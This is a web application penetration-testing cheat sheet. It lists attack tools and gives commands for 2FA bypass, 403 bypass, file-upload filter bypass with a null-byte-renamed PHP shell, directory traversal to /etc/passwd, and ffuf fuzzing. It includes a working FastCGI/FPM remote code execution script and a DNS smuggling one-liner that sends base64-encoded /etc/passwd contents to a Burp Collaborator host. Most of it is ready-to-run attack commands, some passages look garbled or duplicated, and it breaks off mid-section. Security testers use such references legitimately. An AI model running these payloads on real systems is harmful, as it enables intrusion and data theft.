# Web Application Analysis

- [Resources](#resources)

## Table of Contents

- [2FA Bypass Techniques](#2fa-bypass-techniques)
- [403 Bypass](#403-bypass)
- [Application Programming Interface (API)](#application-programming-interface-api)
- [Arjun](#arjun)
- [Asset Discovery](#asset-discovery)
- [Burp Suite](#burp-suite)
- [Bypassing File Upload Restrictions](#bypassing-file-upload-restrictions)
- [cadaver](#cadaver)
- [Command Injection](#command-injection)
- [commix](#commix)
- [Common File Extensions](#common-file-extensions)
- [curl](#curl)
- [davtest](#davtest)
- [DirBuster](#dirbuster)
- [Directory Traversal Attack](#directory-traversal-attack)
- [dirsearch](#dirsearch)
- [DNS Smuggling](#dns-smuggling)
- [DS_Walk](#ds_walk)
- [Favicon](#favicon)
- [feroxbuster](#feroxbuster)
- [ffuf](#ffuf)
- [Flask-Unsign](#flask-unsign)
- [gf](#gf)
- [GitHub](#github)
- [GitTools](#gittools)
- [GIXY](#gixy)
- [Gobuster](#gobuster)
- [gron](#gron)
- [Gxss](#gxss)
- [hakcheckurl](#hakcheckurl)
- [Hakrawler](#hakrawler)
- [Host Header Regex Bypass](#host-header-regex-bypass)
- [HTML Injection](#html-injection)
- [HTTP Request Methods](#http-request-methods)
- [HTTP Request Smuggling / HTTP Desync Attack](#http-request-smuggling--http-desync-attack)
- [httprobe](#httprobe)
- [httpx](#httpx)
- [Interactsh](#interactsh)
- [JavaScript](#javascript)
- [Jenkins](#jenkins)
- [jsleak](#jsleak)
- [JWT_Tool](#jwt_tool)
- [Kiterunner](#kiterunner)
- [kxss](#kxss)
- [Kyubi](#kyubi)
- [Leaky Paths](#leaky-paths)
- [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
- [Lodash](#lodash)
- [Log Poisoning](#log-poisoning)
- [Magic Bytes](#magic-bytes)
- [mitmproxy](#mitmproxy)
- [Next.js](#nextjs)
- [ngrok](#ngrok)
- [OpenSSL](#openssl)
- [PadBuster](#padbuster)
- [PDF PHP Inclusion](#pdf-php-inclusion)
- [PHP](#php)
- [Poison Null Byte](#poison-null-byte)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf)
- [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
- [Spring Framework](#spring-framework)
- [Subdomain Takeover](#subdomain-takeover)
- [Symfony](#symfony)
- [unfurl](#unfurl)
- [uro](#uro)
- [Upload Filter Bypass](#upload-filter-bypass)
- [Upload Vulnerabilities](#upload-vulnerabilities)
- [waybackurls](#waybackurls)
- [Web Application Firewall (WAF) Bypasses](#web-application-firewall-waf-bypasses)
- [Web Log Poisoning](#web-log-poisoning)
- [Websocket Request Smuggling](#websocket-request-smuggling)
- [Wfuzz](#wfuzz)
- [WhatWeb](#whatweb)
- [Wordpress](#wordpress)
- [WPScan](#wpscan)
- [wrapwrap](#wrapwrap)
- [XML External Entity (XXE)](#xml-external-entity-xxe)
- [XSRFProbe (Cross-Site Request Forgery / CSRF / XSRF)](#xsrfprobe-cross-site-request-forgery--csrf--xsrf)
- [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AllThingsSSRF | This is a collection of writeups, cheatsheets, videos, related to SSRF in one single location. | https://github.com/jdonsec/AllThingsSSRF |
| anew | A tool for adding new lines to files, skipping duplicates. | https://github.com/tomnomnom/anew |
| Arjun | HTTP Parameter Discovery Suite | https://github.com/s0md3v/Arjun |
| Awesome API Security | A collection of awesome API Security tools and resources. | https://github.com/arainho/awesome-api-security |
| cariddi | Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more. | https://github.com/edoardottt/cariddi |
| CipherScan | Cipherscan tests the ordering of the SSL/TLS ciphers on a given target, for all major versions of SSL and TLS. | https://github.com/mozilla/cipherscan |
| Client-Side Prototype Pollution | In this repository, I am trying to collect examples of libraries that are vulnerable to Prototype Pollution due to document.location parsing and useful script gadgets that can be used to demonstrate the impact. | https://github.com/BlackFan/client-side-prototype-pollution |
| Commix | Commix (short for [comm]and [i]njection e[x]ploiter) is an open source penetration testing tool. | https://github.com/commixproject/commix |
| cookie-monster | A utility for automating the testing and re-signing of Express.js cookie secrets. | https://github.com/DigitalInterruption/cookie-monster |
| DalFox | DalFox is an powerful open source XSS scanning tool and parameter analyzer and utility that fast the process of detecting and verify XSS flaws. | https://github.com/hahwul/dalfox |
| DOMXSS Wiki | The DOMXSS Wiki is a Knowledge Base for defining sources of attacker controlled inputs and sinks which potentially could introduce DOM Based XSS issues. | https://github.com/wisec/domxsswiki/wiki |
| DS_Walk | Python tool for enumerating directories and files on web servers that contain a publicly readable .ds_store file. | https://github.com/Keramas/DS_Walk |
| DumpsterDiver | DumpsterDiver is a tool, which can analyze big volumes of data in search of hardcoded secrets like keys (e.g. AWS Access Key, Azure Share Key or SSH keys) or passwords. | https://github.com/securing/DumpsterDiver |
| EarlyBird | EarlyBird is a sensitive data detection tool capable of scanning source code repositories for clear text password violations, PII, outdated cryptography methods, key files and more. | https://github.com/americanexpress/earlybird |
| ezXSS | ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting. | https://github.com/ssl/ezXSS |
| Fenjing | 专为CTF设计的Jinja2 SSTI全自动绕WAF脚本 | A Jinja2 SSTI cracker for bypassing WAF, designed for CTF | https://github.com/Marven11/Fenjing |
| feroxbuster | A simple, fast, recursive content discovery tool written in Rust. | https://github.com/epi052/feroxbuster |
| ffuf | A fast web fuzzer written in Go. | https://github.com/ffuf/ffuf |
| gf | A wrapper around grep, to help you grep for things | https://github.com/tomnomnom/gf |
| GitDorker | GitDorker is a tool that utilizes the GitHub Search API and an extensive list of GitHub dorks that I've compiled from various sources to provide an overview of sensitive information stored on github given a search query. | https://github.com/obheda12/GitDorker |
| GitTools | This repository contains three small python/bash scripts used for the Git research. | https://github.com/internetwache/GitTools |
| Gobuster | Gobuster is a tool used to brute-force URIs, DNS subdomains, Virtual Host names and open Amazon S3 buckets | https://github.com/OJ/gobuster |
| grayhatwarfare shorteners | Search Shortener Urls | https://shorteners.grayhatwarfare.com |
| gron | Make JSON greppable! | https://github.com/tomnomnom/gron |
| Gxss | A tool to check a bunch of URLs that contain reflecting params. | https://github.com/KathanP19/Gxss |
| Hakrawler | Fast golang web crawler for gathering URLs and JavaScript file locations. | https://github.com/hakluke/hakrawler |
| haktrails | Golang client for querying SecurityTrails API data. | https://github.com/hakluke/haktrails |
| httpbin | A simple HTTP Request & Response Service. | https://httpbin.org/#/ |
| httprobe | Take a list of domains and probe for working HTTP and HTTPS servers | https://github.com/tomnomnom/httprobe |
| httpx | httpx is a fast and multi-purpose HTTP toolkit allow to run multiple probers using retryablehttp library, it is designed to maintain the result reliability with increased threads. | https://github.com/projectdiscovery/httpx |
| interact.sh | HTTP Request & Response Service | https://app.interactsh.com/#/ |
| ipsourcebypass | This Python script can be used to bypass IP source restrictions using HTTP headers. | https://github.com/p0dalirius/ipsourcebypass |
| Java-Deserialization-Cheat-Sheet | The cheat sheet about Java Deserialization vulnerabilities | https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet |
| JSFuck | JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code. | http://www.jsfuck.com |
| JSFuck []()!+ | Write any JavaScript with 6 Characters: []()!+ | https://github.com/aemkei/jsfuck |
| jsleak | jsleak is a tool to find secret , paths or links in the source code during the recon. | https://github.com/channyein1337/jsleak |
| JSON Web Tokens | JSON Web Token Debugger | https://jwt.io |
| JSON Web Tokens | JSON Web Token Debugger | https://jwt.ms |
| JWT_Tool | The JSON Web Token Toolkit v2 | https://github.com/ticarpi/jwt_tool |
| JWTLens | Advanced JWT Security Analysis & Vulnerability Detection | https://jwtlens.netlify.app |
| KeyHacks | KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid. | https://github.com/streaak/keyhacks |
| kxss | This a adaption of tomnomnom's kxss tool with a different output format | https://github.com/Emoe/kxss |
| Leaky Paths | A collection of special paths linked to major web CVEs, known misconfigurations, juicy APIs ..etc. It could be used as a part of web content discovery, to scan passively for high-quality endpoints and quick-wins. | https://github.com/ayoubfathi/leaky-paths |
| Lodash | The Lodash library exported as a UMD module. | https://github.com/lodash/lodash |
| Modlishka | Modlishka. Reverse Proxy. | https://github.com/drk1wi/Modlishka |
| ngrok | ngrok is the programmable network edge that adds connectivity, security, and observability to your apps with no code changes. | https://ngrok.com |
| Notify | Notify is a Go-based assistance package that enables you to stream the output of several tools (or read from a file) and publish it to a variety of supported platforms. | https://github.com/projectdiscovery/notify |
| NtHiM | Super Fast Sub-domain Takeover Detection | https://github.com/TheBinitGhimire/NtHiM |
| Oralyzer | Oralyzer, a simple python script that probes for Open Redirection vulnerability in a website. | https://github.com/r0075h3ll/Oralyzer |
| PayloadsAllTheThings | A list of useful payloads and bypasses for Web Application Security. | https://github.com/swisskyrepo/PayloadsAllTheThings |
| PHPGGC | PHPGGC: PHP Generic Gadget Chains | https://github.com/ambionics/phpggc |
| pingb | HTTP Request & Response Service | http://pingb.in |
| Recox | The script aims to help in classifying vulnerabilities in web applications. | https://github.com/samhaxr/recox |
| reNgine | The only web application recon tool you will ever need! | https://github.com/yogeshojha/rengine |
| Request Catcher | Request Catcher will create a subdomain on which you can test an application. | https://requestcatcher.com |
| SSRFIRE | An automated SSRF finder. Just give the domain name and your server and chill! ;) Also has options to find XSS and open redirects | https://github.com/ksharinarayanan/SSRFire |
| SSRFmap | SSRF are often used to leverage actions on other services, this framework aims to find and exploit these services easily. | https://github.com/swisskyrepo/SSRFmap |
| SSRF testing resources | SSRF (Server Side Request Forgery) testing resources | https://github.com/cujanovic/SSRF-Testing |
| SSTImap | Automatic SSTI detection tool with interactive interface | https://github.com/vladko312/SSTImap |
| toxssin | An XSS exploitation command-line interface and payload generator. | https://github.com/t3l3machus/toxssin |
| Tplmap | Server-Side Template Injection and Code Injection Detection and Exploitation Tool | https://github.com/epinna/tplmap |
| truffleHog | Find leaked credentials. | https://github.com/trufflesecurity/truffleHog |
| unfurl | Pull out bits of URLs provided on stdin | https://github.com/tomnomnom/unfurl |
| uro | declutters url lists for crawling/pentesting | https://github.com/s0md3v/uro |
| waybackurls | Fetch all the URLs that the Wayback Machine knows about for a domain | https://github.com/tomnomnom/waybackurls |
| Webhook.site | Webhook.site lets you easily inspect, test and automate (with the visual Custom Actions builder, or WebhookScript) any incoming HTTP request or e-mail. | https://webhook.site |
| Weird Proxies | It's a cheat sheet about behaviour of various reverse proxies and related attacks. | https://github.com/GrrrDog/weird_proxies |
| Wfuzz | Wfuzz - The Web Fuzzer | https://github.com/xmendez/wfuzz |
| WhatWeb | Next generation web scanner | https://github.com/urbanadventurer/WhatWeb |
| WPScan | WordPress Security Scanner | https://github.com/wpscanteam/wpscan |
| x8 | Hidden parameters discovery suite written in Rust. | https://github.com/Sh1Yo/x8 |
| XSRFProbe | The Prime Cross Site Request Forgery Audit & Exploitation Toolkit. | https://github.com/0xInfection/XSRFProbe |
| XSStrike | Most advanced XSS scanner. | https://github.com/s0md3v/XSStrike |
| ysoserial | A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization. | https://github.com/frohoff/ysoserial |

## 2FA Bypass Techniques

### 1. Response Manipulation

If the value `"success":false` can be found in the response, change it to `"success":true`.

### 2. Status Code Manipulation

If theStatus Code is `4xx` try to change it to `200 OK` and see if it bypasses restrictions.

### 3. 2FA Code Leakage in Response

Check the response of the `2FA Code Triggering Request` to see if the code is leaked.

### 4. JS File Analysis

Rare but some `JS Files` may contain info about the `2FA Code`, worth giving a shot.

### 5. 2FA Code Reusability

Same code can be reused.

### 6. Lack of Brute-Force Protection

Possible to `Brute-Force` any length 2FA Code.

### 7. Missing 2FA Code Integrity Validation

Code for `any` user account can be used to bypass the 2FA.

### 8. CSRF on 2FA Disabling

No `CSRF Protection` on `Disable 2FA`, also there is no `Authentication Confirmation`.

### 9. Password Reset Disable 2FA

2FA gets disabled on `Password Change or Email Change`.

### 10. Clickjacking on 2FA Disabling Page

Put an `Iframe` on the `2FA Disabling Page` and use `Social Engineering` to trick the victim to disable 2FA.

### 11. Bypass 2FA with null or 000000

Enter the code `000000` or `null` to bypass 2FA protection.

#### Steps:

1. Enter `null` in 2FA code.
2. Enter `000000` in 2FA code.
3. Send empty code - Someone found this in Grammarly.
4. Open a new tab in the same browser and check if other `API Endpoints` are accessible without entering 2FA.

### 12. Google Authenticator Bypass

#### Steps:

1. Set-up Google Authenticator for 2FA.
2. Now, 2FA is enabled.
3. Go on the `Password Reset Page` and `change` your `password`.
4. If your website redirects you to your dashboard then `2FA (Google Authenticator)` is bypassed.

### 13. Bypassing OTP in Registration Forms by repeating the Form Eubmission multiple Times using Repeater

#### Steps:

1. Create an account with a `non-existing` phone number.
2. Intercept the request in `Burp Suite`.
3. Send the request to the repeater and forward.
4. Go to the Repeater tab and `change` the `non-existent` phone number to your phone number.
5. If you got an OTP to your phone, try using that OTP to register that non-existent number.

## 403 Bypass

### HTTP Header Payload

```console
$ curl -I http://<RHOST> -H "X-Client-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-CLIENT-IP: 127.0.0.1"
$ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
```

## Application Programming Interface (API)

### Testing Methodology

*small and not complete list*

- Reconnaissance
	- API Endpoints
	- JavaScript Files
- Testing
	- HTTP Methods
		- GET
		- POST
		- PUT
		- HEAD
		- PATCH
		- OPTIONS
		- TRACE
		- CONNECT
		- DELETE
	- Unauthorized Access
	- Information Disclosure
	- Object Level Authorization
		- Session Label Swapping
	- Broken User Authentication
	- Excessive Data Exposure
	- Broken Function Level Authorization
	- Mass Assignment
	- SQL and NoSQL Injection
	- Interchange Data Manipulation

### Bypass List

```console
https://<RHOST>/admin/password/edit
```

```console
?
??
&
3
#
%
/
/.. ;/
../
.. /
..%2f
\..\.\
.././
%20
%09
%00
%3f
%26
%23
..%00/
..%0d/
..%5c
..%ff/
%2e%2e%2f
.%2e/
;.json
.json
```

### Reconnaissance

#### Automation using ffuf

```console
$ ffuf -w /PATH/TO/WORDLIST/<WORDLIST> -u http://<RHOST>/api/v2/FUZZ -H 'Authorization: Bearer <TOKEN>' -mc 401,403,405,415,200
```

#### Manual Enumeration

```console
$ curl -ik http://<RHOST>/api/v2/list -X OPTIONS -H 'Authorization: Bearer <TOKEN>'
$ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>'
$ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{"title":"test123"}'
$ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{"title":"test123","body":"test123"}'
$ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{"title":"test123","body":"<u>test123"}'
```

## Arjun

> https://github.com/s0md3v/Arjun

```console
$ pipx install arjun
```

```console
$ arjun -u <RHOST>
$ arjun -u <RHOST> -m <METHOD>
```

## Asset Discovery

```console
$ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
```

## Burp Suite

> https://portswigger.net/burp

### Filter Options

- Proxy > Options > Intercept Client Requets > Is in target scope
- Proxy > Options > Intercept Server Responses > Is in target scope

### Shortcuts

```console
Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
```

### Tweaks

Burp Suite > Proxy > Proxy settings > TLS pass through

```console
.*\.google\.com 
.*\.gstatic\.com
.*\.mozilla\.com
.*\.googleapis\.com
.*\.pki\.google\.com
```

### Set Proxy Environment Variables

```console
$ export http_proxy=http://localhost:8080
$ export https_proxy=https://localhost:8080
$ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
```

### Extensions

- 5GC API Parser
- 403 Bypasser
- Active Scan++
- Asset Discovery
- Autorize
- Backslash Powered Scanner
- CO2
- Collaborator Everywhere
- Content Type Converter
- Distribute Damage
- Encode IP
- GAP
- IIS Tilde
- IP Rotate
- J2EEScan
- JS Link Finder
- JS Miner
- JSON Web Tokens
- Logger++
- Log Viewer
- Look Over There
- Param Miner
- SAML Raider
- Software Vulnerability Scanner
- SQLiPy Sqlmap Integration
- Upload Scanner
- ViewState Editor

### Filter for SSRF (AutoRepeater)

```console
((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})
```

## Bypassing File Upload Restrictions

* file.php -> file.jpg
* file.php -> file.php.jpg
* file.asp -> file.asp;.jpg
* file.gif (contains php code, but starts with string GIF/GIF98)
* 00%
* file.jpg with php backdoor in exif (see below)
* .jpg -> proxy intercept -> rename to .php

### PDF Upload Filter Bypass

Create a `PHP Reverse / Web Shell`, name it `shell.phpX.pdf` and `zip` it.

```console
$ touch shell.phpX.pdf
$ zip shell.zip shell.phpX.pdf
```

Open the `Zip Archive` in your favourite `Hex Editor`.

```console
00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
00000A90  2E 70 68 70 58 2E 70 64  66 55 54 05 00 03 A3 6F  .phpX.pdfUT....o
```

Replace the `X` with `Null Bytes (00)` and save it.

```console
00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
00000A90  2E 70 68 70 00 2E 70 64  66 55 54 05 00 03 A3 6F  .php..pdfUT....o
```

After uploading you can remove the `space` and access the file.

## cadaver

### General Usage

```console
$ cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
```

### Common Commands

```console
dav:/<WEBDAV_DIRECTORY>/> cd C
dav:/<WEBDAV_DIRECTORY>/C/> ls
dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
```

## Command Injection

### Vulnerable Functions in PHP

* Exec
* Passthru
* System

### Input Sanitisation

* filter_input

### Filter Bypass

```console
$payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```

## commix

```console
$ python3 commix.py --url="http://<RHOST>:5013/graphql" --data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg
```

## Common File Extensions

```console
7z,action,ashx,asp,aspx,backup,bak,bk,bz,c,cgi,conf,config,dat,db,dhtml,do,doc,docm,docx,dot,dotm,go,htm,html,ini,jar,java,js,js.map,json,jsp,jsp.source,jspx,jsx,log,old,pdb,pdf,php,phtm,phtml,pl,py,pyc,pyz,rar,rhtml,shtm,shtml,sql,sqlite3,svc,tar,tar.bz2,tar.gz,tsx,txt,wsdl,xhtm,xhtml,xls,xlsm,xlst,xlsx,xltm,xml,zip
```

```console
.7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bk,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.php,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## curl

### Common Commands

```console
$ curl --trace - http://<RHOST>
```

### Uploading Files through Upload Forms

#### POST File

```console
$ curl -X POST -F "file=@/PATH/TO/FILE/<FILE>.php" http://<RHOST>/<FILE>.php --cookie "cookie"
```

#### POST Binary Data to Web Form

```console
$ curl -F "field=<file.zip" http://<RHOST>/<FILE>.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
```

## davtest

```console
$ davtest -auth <USERNAME>:<FOOBAR> -sendbd auto -url http://<RHOST>/<WEBDAV_DIRECTORY>/
```

## DirBuster

> https://github.com/KajanM/DirBuster

```console
-r    // don't search recursively
-w    // scan with big wordlists

$ dirb http://<RHOST>
```

## Directory Traversal Attack

### Skeleton Payload Request

```console
GET /../../../../../../../../etc/passwd HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1
```

### Read /etc/passwd

```console
GET // HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Referer: http://<RHOST>:<RPORT>/
Upgrade-Insecure-Requests: 1GET /../../../../../../../../etc/passwd HTTP/1.1
```

## dirsearch

> https://github.com/maurosoria/dirsearch

### General Usage

```console
-i    // includes specific status codes
-e    // excludes specific status codes
-x    // excludes specific status codes
-m    // specifies HTTP method
```

### Common Commands

```console
$ dirsearch -u http://<RHOST>:<RPORT>
$ dirsearch -u http://<RHOST>:<RPORT> -m POST
$ dirsearch -u http://<RHOST>:<RPORT> -e *
$ dirsearch -u http://<RHOST>:<RPORT>/ -R 5 -e http,php,html,css /usr/share/wordlists/wfuzz/webservices/ws-dirs.txt
```

## DNS Smuggling

```console
GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.0wdj2957gw6t7g5463t7063hy.burpcollborator.net
```

## DS_Walk

> https://github.com/Keramas/DS_Walk

```console
$ python ds_walk.py -u http://<RHOST>
```

## Favicon

> https://wiki.owasp.org/index.php/OWASP_favicon_database

```console
$ curl https://<RHOST>/sites/favicon/images/favicon.ico | md5sum
```

## FastCGI Process Manager (FPM)

> https://github.com/hannob/fpmvuln

> https://github.com/hannob/fpmvuln/blob/master/fpmrce

```bash
#!/bin/bash

# script will try to execute PHP code on target host

PAYLOAD="<?php echo 1382+3871;" # add payload here
FILENAMES="/usr/bin/phar.phar /usr/share/php/PEAR.php" # replace one or more file paths with on the target existing php files

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    grep -q 5253 $OUTPUT
    [ $? -eq 0 ] && echo "+++ RCE success with $FN on $HOST, output in $OUTPUT"
done
```

## feroxbuster

> https://github.com/epi052/feroxbuster

> https://epi052.github.io/feroxbuster-docs/

### Common Commands

```console
$ feroxbuster -u http://<RHOST>/
$ feroxbuster -u http://<RHOST>/ --extract-links
$ feroxbuster -u http://<RHOST>/ --filter-status 301
$ feroxbuster -u http://<RHOST>/ -s <STATUS_CODES>
$ feroxbuster -u http://<RHOST>/ --scan-dir-listings
$ feroxbuster -u http://<RHOST>/ -x php
$ feroxbuster -u http://<RHOST>/ -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extract-links
$ feroxbuster -u http://<RHOST>/ -b sessionId=<ID>
$ feroxbuster -u http://<RHOST>/ --rate-limit 100
$ feroxbuster -u http://<RHOST>/ --filter-regex '[aA]ccess [dD]enied.?' --output <FILE> --json
$ feroxbuster -u http://<RHOST>/ --replay-proxy http://localhost:8080 --replay-codes 200 302 --insecure
```

## ffuf

> https://github.com/ffuf/ffuf

> https://github.com/ffuf/ffuf/wiki

### Common Commands

```console
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST>/ -ac
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST>/ -fs 185
$ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

### Using a Request File

```console
$ ffuf -request <FILE> -w /usr/share/wordlists/dirb/common.txt
```

### API Fuzzing

```console
$ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

### Fuzzing with PHP Session ID

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

### Fuzzing with HTTP Request File

```console
$ ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -request <FILE> -request-proto "https" -mc 302 -t 150 | tee progress
```

### Searching for LFI

```console
$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

### Server-Side Request Forgery (SSRF)

```console
$ seq 1 65535 | ffuf -w - -u http://<RHOST> -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'url=http%3A%2F%2Flocalhost%3AFUZZ'
```

```console
$ seq 1 65535 | ffuf -w - -u http://<RHOST> -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylUeVtv36vebZPACI" -d '------WebKitFormBoundarylUeVtv36vebZPACI            
Content-Disposition: form-data; name="foobar"

http://127.0.0.1:FUZZ
------WebKitFormBoundarylUeVtv36vebZPACI
Content-Disposition: form-data; name="foobar"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundarylUeVtv36vebZPACI--' -fr "<PATTERN>"
```

#### Request File Example

```console
$ seq 1 10000 | ffuf -w - -request <FILE>.req -u http://<RHOST> -fr "<PATTERN>"
```

### Testing

> http://fuff.me

#### Basic

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ
```

#### Recursion

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ -recursion
```

#### File Extensions

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/ext/logs/FUZZ -e .log
```

#### No 404 Header

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/no404/FUZZ -fs 669
```

#### Param Mining

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/param/data?FUZZ=1
```

#### Rate Limiting

```console
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429
```

#### IDOR Testing

```console
$ seq 1 1000 | ffuf -w - -u http://ffuf.me/cd/pipes/user?id=FUZZ
```

#### Script for IDOR Testing

```bash
#!/bin/bash

while read i
do
  if [ "$1" == "md5" ]; then
    echo -n $i | md5sum | awk '{ print $1 }'
  elif [ "$1" == "b64" ]; then
    echo -n $i | base64
  else
    echo $i
  fi
done
```

#### Use Script above for Base64 decoding

```console
$ seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://ffuf.me/cd/pipes/user2?id=FUZZ
```

#### MD5 Discovery using the Script

```console
$ seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://ffuf.me/cd/pipes/user3?id=FUZZ
```

#### Virtual Host Discovery

```console
$ ffuf -c -w /usr/share/seclists/Discovery/DNS/namelist.txt -H "Host: FUZZ.ffuf.me" -u http://FUZZ.ffuf.me -ac
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
```

#### Massive File Extension Discovery

```console
$ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<TARGET>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

## Flask-Unsign

> https://github.com/Paradoxis/Flask-Unsign

```console
$ pip install flask-unsign
```

### Decode Cookie

```console
